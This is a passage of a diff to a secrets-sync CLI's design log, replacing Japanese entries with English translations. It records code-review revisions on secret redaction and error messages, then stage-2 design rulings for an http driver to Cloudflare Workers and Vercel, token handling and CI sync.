-**改訂 1(2026-09-07、Cursor Bugbot〔981312d〕)**: (1) `loadReceipt` が有界再同期で前進した後も pull 前のビューを返しており、
-レシートの push が古いビューから始まっていた(push 自身の再同期で救われるが、pull → 書き込みの他の経路は前進したビューを
-引き継ぐ規律)。`pullVariables` の返り値に `verified` を足し、`loadReceipt` はそれを返す。apply のレシート push は同期元の pull で
-さらに前進したビューから始める。(2) `Bun.spawn` は cwd の不在(ENOENT)・非ディレクトリ(ENOTDIR)でも throw し、実行体の不在と
-同じ「未導入」の文面になっていた。spawn の前に cwd を `stat` し、cwd の問題はそれとして名指しする(「Fix the target's cwd in the
-sync config」)。実行体の不在の文面には OS のエラーコードだけ添える。プローブに cwd 不在の態を追加。(3) wrangler は JSON を受け取る
-ので、失敗時に本文を echo すると値は JSON 文字列として逃がされた形(`\"` / `\\` / `\n`)で現れ、素の断片だけの伏せ字化を
-すり抜けた。断片ごとに `JSON.stringify` した形も伏せる(単体テストで固定)。
+**Revision 1 (2026-09-07, Cursor Bugbot〔981312d〕)**: (1) `loadReceipt` still returned the pre-pull view after advancing via bounded re-sync, so the receipt push started from a stale view (rescueable by push's own re-sync, but the discipline is that other pull → write paths inherit the advanced view). `pullVariables`'s return gained `verified`, which `loadReceipt` returns. Apply's receipt push now starts from the view advanced by the sync-source pull. (2) `Bun.spawn` also throws on missing cwd (ENOENT) / non-directory (ENOTDIR), which had become the same "not installed" wording as a missing executable. Now cwd is `stat`ed before spawn, and cwd problems are named as such ("Fix the target's cwd in the sync config"). The missing-executable wording carries only the OS error code. A missing-cwd case was added to the probe. (3) Since wrangler receives JSON, echoing the body on failure surfaces values in JSON-string escaped form (`\"` / `\\` / `\n`), slipping past redaction of bare fragments. Now each fragment's `JSON.stringify`ed form is also redacted (pinned by unit test).
 
-**改訂 2(2026-09-07、pullfrog の初回レビュー〔981312d〕)**: (1) `maruhi.sync.json` は秘密を含まないが**平文の行き先を決める**
-ファイル(`command` / `cwd`)であることを docs に 1 文足し(「CI の workflow と同じ目で差分を見る」)、`apply` が使う実行体と
-ディレクトリを出力に 1 行残す(「Running vercel in <cwd>」)。`command` / `cwd` の制限はしない(`node_modules/.bin/wrangler` が
-正当な用途)。(2) 同期先で先に消された名前をレシートが持ち続けると、`vercel env rm` が失敗し続けて apply が詰まる(同期先を
-読み戻さない設計の帰結)。削除の失敗を警告に格下げして「消えた」ことにする案は、ネットワーク起因の失敗でも消すべき秘密が
-同期先に残るので採らない。**致命のまま、削除の失敗の文面にレシートの作り直し(`maruhi var rm sync-receipt:<target>`)の
-案内を足す**(テストで固定)。`vercel env rm` の不在名の終了コードは人間タスク(実アカウント)で確かめる。(3) `buildInvocations`
-は UTF-8 でない値を `""` に畳んでいた(prepareWork が先に弾くので到達しないが、空の秘密を黙って書く最悪の形)→ 内部不整合
-として throw(文面は値も名前も運ばない。単体テストで固定)。(4) 捕捉出力の上限は UTF-16 の文字数で数えていたので
-`EXEC_OUTPUT_CAP_CHARS` に改名し、「表示の上限であって記憶量の上限ではない(全出力を読んでから切る)」と正直に書く。
-(5) テストの `.replace("1 to add", "0 to add")` をリテラルに。(6) `loadReceipt` の「前進したビューを返す」は改訂 1 で実装済み。
+**Revision 2 (2026-09-07, pullfrog's first review〔981312d〕)**: (1) docs gained one sentence stating `maruhi.sync.json` contains no secrets but **is a file that decides where plaintext goes** (`command` / `cwd`) ("review diffs with the same eye as a CI workflow"), and `apply` leaves one output line naming the executable and directory it uses ("Running vercel in <cwd>"). No restriction is placed on `command` / `cwd` (`node_modules/.bin/wrangler` is a legitimate use). (2) If the receipt keeps a name already deleted at the destination, `vercel env rm` keeps failing and apply stalls (a consequence of the never-read-back design). The option of downgrading a delete failure to a warning and treating it as "gone" was rejected — on a network-caused failure, a secret that should be deleted would remain at the destination. **It stays fatal, and the delete-failure message gained guidance to rebuild the receipt (`maruhi var rm sync-receipt:<target>`)** (pinned by test). `vercel env rm`'s exit code for a missing name is confirmed as a human task (real account). (3) `buildInvocations` folded non-UTF-8 values into `""` (unreachable since prepareWork rejects first, but the worst shape — silently writing an empty secret) → now throws as an internal inconsistency (the message carries neither value nor name; pinned by unit test). (4) The captured-output cap was counted in UTF-16 code units, so it's renamed `EXEC_OUTPUT_CAP_CHARS`, honestly documented as "a display cap, not a memory cap (the whole output is read then cut)". (5) The test's `.replace("1 to add", "0 to add")` became a literal. (6) `loadReceipt` "returning the advanced view" was already implemented in revision 1.
 
-**改訂 3(2026-09-07、pullfrog の差分レビュー〔12519d0〕)**: 改訂 2 の「レシートを作り直す」案内は、最初の削除で止まった
-残りの(未試行の)削除も忘れさせる(作り直したレシートには消す名前が無い)。削除の失敗の文面に、未試行の名前を添えて
-「先に同期先で手で消す」と言う(テストで固定 — 2 つ目の削除が呼ばれていないことも断言)。
+**Revision 3 (2026-09-07, pullfrog's diff review〔12519d0〕)**: revision 2's "rebuild the receipt" guidance also made untried remaining deletions be forgotten (a rebuilt receipt has no names to delete). The delete-failure message now lists the untried names and says "delete them by hand at the destination first" (pinned by test — it also asserts the second delete is never called).
 
-**改訂 4(2026-09-07、Cursor Security Agent〔367acd2〕)**: 捕捉したベンダー出力を `live.ts` が**伏せる前に**末尾 64 K 文字で
-切っていた。切れ目にかかった値の後半は断片(値・各行・JSON 逃がし形)のどれとも一致せず、失敗時の表示にそのまま残る
-(Workers の値は 64 KiB 近くまであり、wrangler が本文を echo すれば起きうる)。候補: (i) 切るのを伏せた後に移す(`exec` は全出力を
-そのまま返し、`scrubVendorOutput` が伏せてから末尾 64 K 文字 → 20 行)/ (ii) `live.ts` で行境界に揃えて切る(切れ目の直後の
-改行までを捨てる — 各行の断片で伏せられる)/ (iii) `exec` に伏せ字化の関数を渡す。(iii) は `live.ts` に値を持ち込む層の混線で
-棄却、(ii) は行構造の偶然に頼る(`\r` だけの区切りや改行を含まない巨大出力で保証が崩れる)。**(i) を採る**: 「秘密を含みうる文字列は
-伏せてから切る」という一般則そのもので、記憶量は元から全出力を読んでいたので変わらない(改訂 2 で正直に書いた通り)。
-`EXEC_OUTPUT_CAP_CHARS`(run.ts)は sync-exec.ts の非公開 `SHOWN_TAIL_CHARS` に移り、`ExecOutcome.output` の JSDoc は
-「切らずに丸ごと。伏せてから切る」に。固定: 単体テストは値の 20 文字目に切れ目が来る長さの出力で後半が残らないことを、実プロセスの
-プローブは 70,000 文字の行が丸ごと返ることを断言する。
+**Revision 4 (2026-09-07, Cursor Security Agent〔367acd2〕)**: `live.ts` was cutting the captured vendor output at the last 64 K chars **before** redacting it. The tail half of a value straddling the cut matches none of the fragments (the value, its lines, the JSON-escaped form) and survives into the failure display as-is (Workers values can approach 64 KiB, so this can happen if wrangler echoes the body). Candidates: (i) move the cut after redaction (`exec` returns the whole output as-is; `scrubVendorOutput` redacts then takes last 64 K chars → 20 lines) / (ii) align the cut to a line boundary in `live.ts` (discard up to the newline right after the cut — redactable per-line fragments) / (iii) pass `exec` a redacting function. (iii) is rejected as mixing the layer that brings values into `live.ts`; (ii) relies on the accident of line structure (the guarantee collapses on `\r`-only delimiters or giant newline-free output). **(i) adopted**: it's literally the general rule "cut a possibly-secret-bearing string only after redacting", and memory use is unchanged since the whole output was already being read (as honestly documented in revision 2). `EXEC_OUTPUT_CAP_CHARS` (run.ts) moved to sync-exec.ts's private `SHOWN_TAIL_CHARS`; `ExecOutcome.output`'s JSDoc is now "whole, uncut; cut only after redaction". Pinned: a unit test asserts the back half doesn't survive when the cut lands on a value's 20th char; the real-process probe asserts a 70,000-char line returns whole.
 
-**第 2 段以降への申し送り**: (1) http ドライバ(CI と未導入時。通信先の増加は hosted-design.md §5-1 の線引きで裁定)、(2) CI での
-`sync`(署名鍵が無いのでレシート無しの再適用 = P3。`ci run` の子は `MARUHI_*` を持たない)、(3) M1(`env rotate` がレシートを
-進める)、(4) `sync init`、(5) 全ターゲット一括の plan(`--all`)、(6) autoSync / push 時同期 / `gh workflow run`、(7) gh プリセット
-(SY5 — 宣言だけで載る形は確認済み)、(8) Vercel の 16 KiB 上限は macOS の実測後に見直す。
+**Handoff to stage 2 onward**: (1) the http driver (CI and CLI-absent cases; endpoint growth is ruled by hosted-design.md §5-1's line), (2) `sync` in CI (no signing key → re-apply everything with no receipt = P3. `ci run`'s children don't carry `MARUHI_*`), (3) M1 (`env rotate` advances receipts), (4) `sync init`, (5) all-target plan (`--all`), (6) autoSync / push-time sync / `gh workflow run`, (7) the gh preset (SY5 — confirmed it rides on declaration only), (8) Vercel's 16 KiB cap is revisited after macOS measurement.
 
-#### 第 2 段(2026-09-07)
+#### Stage 2 (2026-09-07)
 
-第 1 段の裁定 A の段割りのうち**第 2 段**を実装した。設計は §3 冒頭「同期の最終形」の表を正とし、蒸し返していない。段の中身の
-入れ替えはしていない(4 項目のうち M1 だけを PR 単位で後ろへ送った — 裁定 A′)。各裁定点は第 1 段と同じループ(候補 3 つ以上 →
-上位互換 / 銀の弾丸 → 新案が出ない周が 1 回あれば終了 → 理由付きで選定)で決め、「新案なし」の周では壊れ方(境界値・環境差・
-失敗時の残骸・応答本文に何が混ざるか)を問うた。
+Implemented **stage 2** of stage 1's ruling A staging. The design's source of truth is the "final form of sync" table at §3's head; not re-litigated. The stage contents weren't swapped (only M1 of the 4 items was deferred by one PR unit — ruling A′). Each ruling point was decided by the same loop as stage 1 (3+ candidates → superset / silver bullet → end once a round produces no new options → choose with reasons), and on "no new option" rounds we asked about failure modes (boundary values, environment differences, debris on failure, what contaminates response bodies).
 
-**前提の確認(実物・実装で確かめた事実。日付はすべて 2026-09-07)**:
-(1) **wrangler 4.128.0 `secret bulk`**(`apps/server/node_modules/wrangler/wrangler-dist/cli.js`): `putBulkSecrets` =
-`PATCH /accounts/{accountId}/workers/scripts/{scriptName}/secrets-bulk`、`Content-Type: application/merge-patch+json`、本文
-`{"secrets": {NAME: {"name","text","type":"secret_text"} | null}}`(null = 削除)、1 リクエスト。`getLegacyScriptName` =
-`args.name && args.env ? \`${name}-${env}\` : args.name ?? config.name`。**Worker 不在の判定は `isWorkerNotFoundError` =
-エラーコード 10007 / 10090**(プロンプトが挙げた 10215 は `VERSION_NOT_DEPLOYED_ERR_CODE` で、`secret put` の「最新版が
-未デプロイ」の別経路)。不在なら wrangler は draft Worker(`PUT …/scripts/{name}` に空の fetch ハンドラ)を作ってから再送する。
-envelope は `{success, errors[{code,message}], messages, result}` で、`fetchResultBase` は `success` だけを見る。429 は
-`Retry-After` を読んで `retryOnAPIFailure` が待つ。API の base は `https://api.cloudflare.com/client/v4`。account ID は wrangler の
-設定 / `CLOUDFLARE_ACCOUNT_ID` / メンバーシップ API から解決する(http ドライバは持たない — 裁定 G)。
-(2) **Vercel CLI 59.11.7**(scratchpad へ `bun add vercel@latest`。**版は SY1 / 第 1 段と同じ 59.11.7**): `env add --force` =
-`addEnvRecord` → `POST /v10/projects/{projectId}/env?upsert=true`、本文 `{type, key, value, target[], customEnvironmentIds?,
-gitBranch?, visibility?}`。`type` は `resolveFinalType`: development を含めば "encrypted"、`--no-sensitive`(かつチームポリシー
-なし)で "encrypted"、それ以外は "sensitive"。`env rm` = `getEnvRecords`(`GET /v10/projects/{id}/env?target=&gitBranch=` — `decrypt`
-は渡さない)で `key` を突合して id を選び `DELETE /v10/projects/{id}/env/{envId}`。team は `client.fetch` が `?teamId=` を付ける
-(`GLOBAL_CLI_QUERY_PARAMS`)。`client.fetch` は `retryAfterMs` があれば `sleep(retryAfterMs + 30 s の乱数)` で再試行、4xx は bail。
-**公開 REST docs**(`vercel.com/docs/rest-api/projects/create-one-or-more-environment-variables`、2026-09-07 更新)は同じ
-エンドポイントに**配列**(一括)を受け、応答は `{created, failed[{error:{code,message,key,…}}]}`(201)。値の上限は
-`vercel.com/docs/environment-variables`: **64 KB / デプロイの合計**(edge runtime は 5 KB / 変数)。1 リクエストの件数上限は
-docs に無い。
-(3) **Bun 1.4.0 の `fetch` は `HTTPS_PROXY` / `https_proxy` を見る**(実測: 到達不能な proxy を指すと `ConnectionRefused`)。
-Effect の `FetchHttpClient.layer` は `globalThis.fetch` なので同じ。CI の proxy 環境で追加設定は要らない。
-(4) **Effect `HttpClientRequest.bearerToken` は `Redacted` をそのまま受ける**(api.ts と同じ)。http ドライバはトークンを剥がさずに
-ヘッダーへ載せられる。`HttpClient.execute` は非 2xx でも応答を返す(status 分岐は自前)。
-(5) **CI の資格**: `ci run` は `verifyLeaseResponse` の材料(復号済み変数 + declared)しか持たず、`pushVariable` が要求する
-master sig 鍵を持たない(第 1 段の前提の確認 (1))。リースは環境単位(`POST /projects/:id/environments/:env/lease`)で、
-**同一 OIDC トークンで複数環境をリースする場合は全リクエストで同一の一時鍵を用いる義務**(AUTH_SPEC §14-1)。
-(6) **既存の剥がし場所**: `ci-run.ts: 1`(oidcToken のワイヤ境界)。lease の前段を `ci-lease.ts` に移したので棚卸し表の
-キーも移る。`sync-exec.ts` の `scrubVendorOutput` に伏せる断片としてトークンを渡すのに 1 か所増える。
+**Premise verification (facts confirmed against the real things / the implementation. All dates 2026-09-07)**:
+(1) **wrangler 4.128.0 `secret bulk`** (`apps/server/node_modules/wrangler/wrangler-dist/cli.js`): `putBulkSecrets` = `PATCH /accounts/{accountId}/workers/scripts/{scriptName}/secrets-bulk`, `Content-Type: application/merge-patch+json`, body `{"secrets": {NAME: {"name","text","type":"secret_text"} | null}}` (null = delete), 1 request. `getLegacyScriptName` = `args.name && args.env ? `${name}-${env}` : args.name ?? config.name`. **Worker-absence is determined by `isWorkerNotFoundError` = error codes 10007 / 10090** (the 10215 the prompt raised is `VERSION_NOT_DEPLOYED_ERR_CODE` — a separate `secret put` "latest version not deployed" path). On absence wrangler creates a draft Worker (an empty fetch handler at `PUT …/scripts/{name}`) then re-sends. The envelope is `{success, errors[{code,message}], messages, result}`; `fetchResultBase` looks only at `success`. 429 is read for `Retry-After` and `retryOnAPIFailure` waits. The API base is `https://api.cloudflare.com/client/v4`. The account ID resolves from wrangler's config / `CLOUDFLARE_ACCOUNT_ID` / the membership API (the http driver doesn't have it — ruling G).
+(2) **Vercel CLI 59.11.7** (`bun add vercel@latest` into a scratchpad. **Same version 59.11.7 as SY1 / stage 1**): `env add --force` = `addEnvRecord` → `POST /v10/projects/{projectId}/env?upsert=true`, body `{type, key, value, target[], customEnvironmentIds?, gitBranch?, visibility?}`. `type` via `resolveFinalType`: "encrypted" if it includes development, "encrypted" with `--no-sensitive` (and no team policy), otherwise "sensitive". `env rm` = `getEnvRecords` (`GET /v10/projects/{id}/env?target=&gitBranch=` — `decrypt` isn't passed) → match on `key` to pick an id → `DELETE /v10/projects/{id}/env/{envId}`. For teams, `client.fetch` appends `?teamId=` (`GLOBAL_CLI_QUERY_PARAMS`). `client.fetch` retries with `sleep(retryAfterMs + 30 s random)` when `retryAfterMs` exists; 4xx bails. **The public REST docs** (`vercel.com/docs/rest-api/projects/create-one-or-more-environment-variables`, updated 2026-09-07) accept **an array** (bulk) on the same endpoint, responding `{created, failed[{error:{code,message,key,…}}]}` (201). The value cap per `vercel.com/docs/environment-variables`: **64 KB total per deploy** (edge runtime: 5 KB per variable). A per-request item cap isn't in the docs.
+(3) **Bun 1.4.0's `fetch` honors `HTTPS_PROXY` / `https_proxy`** (measured: pointing at an unreachable proxy gives `ConnectionRefused`). Effect's `FetchHttpClient.layer` is `globalThis.fetch`, so the same. No extra setup needed for CI's proxy environments.
+(4) **Effect's `HttpClientRequest.bearerToken` takes `Redacted` as-is** (same as api.ts). The http driver can put the token on a header without unwrapping it. `HttpClient.execute` returns the response even for non-2xx (status branching is our own).
+(5) **CI's credentials**: `ci run` holds only `verifyLeaseResponse`'s materials (decrypted variables + declared) and lacks the master sig key `pushVariable` requires (stage 1's premise verification (1)). Leases are per-environment (`POST /projects/:id/environments/:env/lease`), and **leasing multiple environments under the same OIDC token obligates using the same ephemeral key across all requests** (AUTH_SPEC §14-1).
+(6) **Existing unwrap sites**: `ci-run.ts: 1` (oidcToken's wire boundary). Since the lease's preceding leg moved to `ci-lease.ts`, the inventory-table key moves too. One more site appears for passing the token to `sync-exec.ts`'s `scrubVendorOutput` as a redacted fragment.
 
-**A′. 第 2 段の切り方(PR 単位と順序)** — 列挙: (i) 4 項目を 1 本 / (ii) 2a = http + CI、2b = M1 + `sync init` / (iii) 2a = http +
-`sync init`、2b = CI + M1 / (iv) 1 項目 1 PR(4 本)。第 1 周の新案: **(v) 2a = http + CI + `sync init`、2b = M1 だけ**(あり —
-4 項目のうち env-rotate.ts〔2,442 行〕に触るのは M1 だけで、独立レビューしたい対象を正確に 1 本へ切り出せる。残る 3 項目は
-すべて sync-* / ci-* のモジュールと同じ docs ページ〔deploy-targets〕を触るので、分けると同じ表と同じ節を 2 度書き換える)。
-第 2 周(壊れ方): (ii) / (iii) は `sync init` が http のキー(`driver` / `token`)を知らないまま先に出て、http が来た時点で
-生成物の形が変わる。(iv) は同じ docs ページへ 3 本の PR が競合する。(v) は 2a が大きいが、3 項目は「同じ設定の型の拡張」で
-一体に読める(なし)。**選定 = (v)**。棄却: (i)(env-rotate.ts の独立レビューが第 1 段の裁定 A の理由)、(ii) / (iii)(init が
-http で書き直しになる)、(iv)(docs の競合)。ROADMAP の SY2 行に「第 2 段 = 2a(完了)/ 2b(未)」と書く。
+**A′. How to cut stage 2 (PR units and order)** — enumeration: (i) the 4 items in one PR / (ii) 2a = http + CI, 2b = M1 + `sync init` / (iii) 2a = http + `sync init`, 2b = CI + M1 / (iv) 1 item per PR (4 PRs). Round-1 new option: **(v) 2a = http + CI + `sync init`, 2b = M1 alone** (available — of the 4 items only M1 touches env-rotate.ts〔2,442 lines〕, so the thing you want independently reviewed is carved out as exactly one PR. The other 3 items all touch the sync-* / ci-* modules and the same docs page〔deploy-targets〕; splitting them would rewrite the same table and sections twice). Round 2 (failure modes): (ii) / (iii) ship `sync init` not knowing http's keys (`driver` / `token`), so the generated artifact's shape changes when http lands. (iv) has 3 PRs contending on the same docs page. (v) makes 2a big, but the 3 items are "extensions to the same config type" and read as one piece (no). **Chosen = (v)**. Rejected: (i) (env-rotate.ts's independent review is stage 1's ruling-A reason), (ii) / (iii) (init gets rewritten under http), (iv) (docs contention). Write on the ROADMAP's SY2 row: "stage 2 = 2a (done) / 2b (not done)".
 
-**H. 設定の版** — 列挙: (i) `version: 1` のまま新キーを足す(第 1 段の CLI は「未知のキー」として拒否) / (ii) `version: 2`
-(第 1 段の CLI は「unsupported config version」として拒否) / (iii) 1 と 2 の両方を受ける。第 1 周の新案: 第 1 段の CLI から
-見た違いは**拒否文の文面だけ**(どちらも fail-closed で、第 1 段の設定は (i) なら無変更で読める)。第 1 段は 1 週間前で、
-ベータ前 = 配布物を持つ利用者がいない。`version` は「既存キーの意味が変わったときにだけ上げる互換線」と定義すれば、
-版を上げる理由が無い(あり)。第 2 周(壊れ方): 第 2 段の設定を第 1 段の CLI に食わせると `targets.web has unknown keys
-(driver, token)` — 読者は「知らないキー = CLI が古い」と分かる。第 1 段の設定は第 2 段の CLI でそのまま通る(テストで
-固定)(なし)。**選定 = (i)**。docs の表に「version は両リリースとも 1。古い CLI は新キーを unknown keys として拒む」と書く。
+**H. Config version** — enumeration: (i) keep `version: 1` and add new keys (stage-1 CLIs reject them as "unknown keys") / (ii) `version: 2` (stage-1 CLIs reject as "unsupported config version") / (iii) accept both 1 and 2. Round-1 new option: seen from a stage-1 CLI, the difference is **only the refusal wording** (both are fail-closed, and a stage-1 config still reads under (i) unchanged). Stage 1 is a week old, and pre-beta = no users hold the artifact. Defining `version` as "the compatibility line bumped only when an existing key's meaning changes" gives no reason to bump it (available). Round 2 (failure modes): feeding a stage-2 config to a stage-1 CLI gives `targets.web has unknown keys (driver, token)` — the reader understands "unknown key = old CLI". A stage-1 config passes as-is on a stage-2 CLI (pinned by test) (no). **Chosen = (i)**. The docs table says "version is 1 in both releases. An old CLI rejects new keys as unknown keys".
 
-**B. http ドライバのインターフェースと宣言的プリセット** — 設定での表し方: (a) ターゲットに `driver: "exec" | "http"`(既定
-exec。プリセット id は共通) / (b) 別のプリセット id(`vercel-http`) / (c) `token` の有無で推定。第 1 周の新案: レシートは
-プリセット id だけを持つので、(a) なら**ドライバを切り替えてもレシートが引き継がれる**(同じ同期先に同じ名前・version を
-届けた事実はドライバに依らない)。(b) は `decodeReceipt` の閉集合が割れ、docs の表も 2 倍になる(あり)。第 2 周(壊れ方):
-(c) は「キーを 1 つ足しただけで平文の行き先が CLI から API に変わる」形で、`maruhi.sync.json` は「平文の行き先を決める
-ファイル」(第 1 段 改訂 2)なので明示にする。(a) では `cwd` / `command` は exec 限定、`token` は http 限定として**逆の
-組み合わせを拒否**する(黙って無視すると「設定したつもりの cwd が効いていない」を作る)。オプションの宣言はドライバごとに
-持つ(Workers の http は wrangler の設定ファイルを読めないので `accountId` / `name` が必須、`config` は無意味 → 拒否。
-Vercel の http は `projectId` 必須、`project` / `scope`〔CLI のリンク解決〕は無意味 → 拒否)(なし)。**選定 = (a)**。
-宣言の中身: `HttpPreset` = `host`(固定)・`batch`・`write`(method / path / query / contentType / body / entry / entries の
-並べ方 / deletedEntry)・`delete`(`in-write` = merge-patch の null / `lookup` = 一覧で id を引いて DELETE)・`response`
-(閉集合 `cloudflare-v4` / `vercel-env`)・`constraints`・`options`・`derive`(スクリプト名の合成・Vercel の type — 値には
-触れない)・`tokenHint`。**型で決めたこと**: パス / クエリのトークン型 `PathToken` に値・名前のトークンは存在せず、値の
-トークン `{kind:"value"}` は `entry`(本文の 1 変数ぶん)の `EntryToken` にしか無い。単体テストが宣言を走査して固定する
-(exec の argv と同じ姿勢)。`HttpClient` の使い方: `api.ts` は maruhi 専用なので `sync-http.ts` に薄い送信部品(`send`)を
-置き、`HttpClientRequest.make(method)(url, {urlParams}) + bearerToken(Redacted) + setHeader(accept / user-agent) + bodyText`
-→ `client.execute` → `response.text`。リトライ: 通信層の失敗と 429 / 502 / 503 / 504 を最大 3 回、`Retry-After`(秒 /
-HTTP 日付)を 30 秒まで尊重、無ければ 0.5 s から倍々。upsert / 削除は冪等なので再送は安全。`retry.ts` の `retryOnConflict` は
-CAS 競合(再同期 → 再署名)の骨格で、時間待ちのリトライとは形が違うので使わない。`User-Agent` は `maruhi-cli/<CLI_VERSION>`
-(oidc-github.ts の `maruhi-cli` に版を足した形。利用者のデータではなく、ベンダーが流量を帰属させるための識別子)。
-**通信先の増加の位置づけ(hosted-design.md §5-1)**: 「テレメトリ禁止 = クライアント → 外部への送信の禁止」は**利用者に
-ついての情報を、利用者の指示なしに**送ることの禁止。http ドライバは利用者が設定に書いた宛先へ、利用者が `apply` /
-`ci sync` と打ったときにだけ、利用者自身の値を運ぶ。`plan` は触れない。宛先はプリセットが固定し設定で差し替えられない。
-docs の「Vendor CLI telemetry」節に「maruhi が話す相手は maruhi サーバーと、http ドライバで apply したときの設定先だけ」と
-1 文で書いた。第 3 周(壊れ方): Vercel の `created` は**値を echo する**(実物の応答形)→ 成功時は本文を捨て、失敗時は抽出
-した断片(`failed[].error.code / key / message`)だけを `scrubVendorOutput` に通す(値の断片 + トークンの断片 + その JSON
-逃がし形)。Cloudflare の envelope も同じ(`errors[].code / message` + `messages`)。応答が JSON でない(WAF のブロック
-ページ)ときは `HTTP <status>` だけを出す(なし)。
+**B. The http driver's interface and declarative presets** — how it's expressed in config: (a) `driver: "exec" | "http"` on the target (default exec. The preset id is shared) / (b) a separate preset id (`vercel-http`) / (c) infer from `token`'s presence. Round-1 new option: the receipt only holds the preset id, so with (a) **the receipt carries over across a driver switch** (the fact that the same names / versions were delivered to the same destination is driver-independent). (b) breaks `decodeReceipt`'s closed set and doubles the docs table (available). Round 2 (failure modes): (c) is the shape "adding one key changes plaintext's destination from the CLI to an API" — `maruhi.sync.json` is "the file that decides where plaintext goes" (stage 1 revision 2), so make it explicit. Under (a), `cwd` / `command` are exec-only and `token` is http-only, so **reject the reverse combinations** (silently ignoring them creates "the cwd I set isn't taking effect"). Option declarations live per driver (Workers http can't read wrangler's config file so `accountId` / `name` are required, `config` is meaningless → rejected. Vercel http requires `projectId`; `project` / `scope`〔CLI link resolution〕are meaningless → rejected) (no). **Chosen = (a)**. The declaration's contents: `HttpPreset` = `host` (fixed), `batch`, `write` (method / path / query / contentType / body / entry / the ordering of entries / deletedEntry), `delete` (`in-write` = merge-patch null / `lookup` = find the id from a list then DELETE), `response` (closed set `cloudflare-v4` / `vercel-env`), `constraints`, `options`, `derive` (script-name composition, Vercel's type — values
+untouched by `derive`) and `tokenHint`. **Decided by types**: the path / query token type `PathToken` has no value or name token, and the value token `{kind:"value"}` exists only on `entry` (one variable's worth of body)'s `EntryToken`. A unit test scans the declarations to pin this (the same posture as exec's argv). How `HttpClient` is used: `api.ts` is maruhi-only, so a thin send part (`send`) goes in `sync-http.ts`: `HttpClientRequest.make(method)(url, {urlParams}) + bearerToken(Redacted) + setHeader(accept / user-agent) + bodyText` → `client.execute` → `response.text`. Retries: transport-layer failures and 429 / 502 / 503 / 504 up to 3 times; `Retry-After` (seconds / HTTP date) honored up to 30 s; otherwise doubling from 0.5 s. Since upsert / delete are idempotent, re-sending is safe. `retry.ts`'s `retryOnConflict` is a skeleton for CAS contention (re-sync → re-sign) — a different shape from timed waits, so unused. `User-Agent` is `maruhi-cli/<CLI_VERSION>` (oidc-github.ts's `maruhi-cli` plus a version. Not user data — an identifier so the vendor can attribute the traffic).
+**Positioning the endpoint growth (hosted-design.md §5-1)**: "no telemetry = no client → external sends" forbids sending **information about the user without the user's direction**. The http driver carries the user's own values to a destination the user wrote in config, only when the user typed `apply` / `ci sync`. `plan` touches nothing. The destination is fixed by the preset and can't be swapped via config. One line added to the docs' "Vendor CLI telemetry" section: "maruhi talks only to the maruhi server and, when you apply via the http driver, the configured destination". Round 3 (failure modes): Vercel's `created` **echoes the values** (the real response shape) → on success the body is discarded; on failure only the extracted fragments (`failed[].error.code / key / message`) go through `scrubVendorOutput` (value fragments + token fragments + their JSON-escaped forms). Cloudflare's envelope is the same (`errors[].code / message` + `messages`). When the response isn't JSON (a WAF block page) only `HTTP <status>` is shown (no).
 
-**C. 統合トークンの取り出し** — 列挙: (i) ターゲットに `token: {environment, name}` / (ii) プリセットが変数名を決め
-(`VERCEL_TOKEN`)、ターゲットは環境だけ / (iii) プロジェクト単位の `tokens` 節。第 1 周の新案: 復号の経路は `pullVariables`
-に `select`(名前の述語)を足す(あり — 検証〔値署名・ステートメント・ラップ〕は環境全体に対して変わらず行い、**復号だけを
-1 変数に絞る**。剥がす場所は増えない。`var.read` 監査行は pull 単位で従来どおり)。第 2 周の新案: 同期元と同じ環境に
-トークンを置く形を**許した上で構造で運ばない**(あり — "all" なら `exclude` に無くても除き、明示リストに載っていれば設定の
-誤り。別環境を必須にすると CI のリースが必ず 2 つになり、逆に同一環境を必須にすると `run --env production` がトークンを
-アプリへ注入する)。第 3 周(壊れ方): `echo` で push したトークンは末尾改行を含み、`Authorization` ヘッダーの値に載らない
-(fetch が投げる)→ 送る前に制御文字を検査して変数名だけを言う(`printf %s` を案内)。トークン変数が無ければ push の案内。
-トークンは**送る直前**に取り出す(production の `--yes` が無い・送るものが無い経路では復号しない)。名前の規則は設けない
-(`MARUHI_` 接頭辞は `run` の注入の規則で、トークンは `run` に載せない前提。docs は専用環境を勧める)。最小権限の案内は
-docs(Cloudflare = Workers Scripts: Edit、Vercel = チームにスコープしたトークン + `teamId`)(なし)。**選定 = (i) + select +
-同一環境の構造的除外**。棄却: (ii)(1 プロジェクトに Vercel のトークンが 2 つある形〔チーム違い〕で衝突)、(iii)(節が
-増えるだけで (i) の情報と同じ)。剥がす場所: `Redacted` のまま `bearerToken` に渡すので**ヘッダーで剥がさない**。本文に
-値を置く直前で 1 か所(`sync-http.ts: 1`)、形の検査で 1 か所(`sync-plan.ts` +1)、伏せ字化で 1 か所(`sync-exec.ts` +1)。
+**C. Extracting the integration token** — enumeration: (i) `token: {environment, name}` on the target / (ii) the preset decides the variable name (`VERCEL_TOKEN`), the target supplies only the environment / (iii) a project-level `tokens` section. Round-1 new option: the decryption path gets `select` (a name predicate) added to `pullVariables` (available — verification〔value signatures, statements, wraps〕still runs against the whole environment unchanged; **only decryption narrows to one variable**. No new unwrap site. `var.read` audit rows stay per-pull as before). Round-2 new option: **allow placing the token in the same environment as the sync source, but structurally never carry it** (available — under "all" it's excluded even absent from `exclude`, and if it appears on an explicit list that's a config error. Requiring a separate environment would always make CI leases 2; conversely requiring the same environment would let `run --env production` inject the token into the app). Round 3 (failure modes): a token pushed via `echo` carries a trailing newline and won't fit on the `Authorization` header (fetch throws) → check for control characters before sending and name only the variable (guide `printf %s`). If the token variable is missing, guide a push. The token is extracted **right before sending** (paths without production's `--yes` or with nothing to send don't decrypt). No naming convention is set (the `MARUHI_` prefix is `run`'s injection rule, and the premise is the token isn't carried by `run`. docs recommends a dedicated environment). Least-privilege guidance is in docs (Cloudflare = Workers Scripts: Edit, Vercel = a team-scoped token + `teamId`) (no). **Chosen = (i) + select + structural same-environment exclusion**. Rejected: (ii) (collides when one project has two Vercel tokens〔different teams〕), (iii) (just adds a section — same information as (i)). Unwrap sites: since the token reaches `bearerToken` still `Redacted`, **the header doesn't unwrap it**. One site right before placing the value in the body (`sync-http.ts: 1`), one for shape checking (`sync-plan.ts` +1), one for redaction (`sync-exec.ts` +1).
 
-**D. CI での `sync`** — コマンドの形: (i) `maruhi ci sync <target>`(`ci run` と同じ明示フラグ + `--config` / `--yes`) /
-(ii) `ci run --sync <target>` / (iii) `sync apply --ci`。第 1 周の新案: リースの前段(一時鍵・OIDC 発行・token-replayed の
-再試行・§9.1 の検証)を `ci-lease.ts` に切り出して `ci run` と共有し、**複数環境を 1 本のトークン・1 つの一時鍵で順に
